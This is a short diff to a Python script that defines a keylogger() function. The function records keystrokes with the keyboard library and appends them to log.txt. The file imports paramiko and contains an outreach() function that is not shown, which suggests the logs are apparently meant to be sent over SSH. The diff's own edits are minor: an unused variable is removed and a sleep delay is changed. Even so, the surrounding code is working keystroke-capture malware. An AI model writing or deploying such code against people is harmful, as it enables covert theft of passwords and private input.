@@ -1,7 +1,6 @@
 import os
 import string
 import time
-
 import keyboard
 import paramiko
 
@@ -29,15 +28,13 @@ def outreach():
 
 def keylogger():
 
-    allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-
     while True:
         file = open('log.txt', 'a')
 
         event = keyboard.read_event()
 
         if event.event_type == keyboard.KEY_DOWN:
-            time.sleep(0.1)
+            time.sleep(0.3)
             char = keyboard.read_key()
 
             if event.name == 'space':
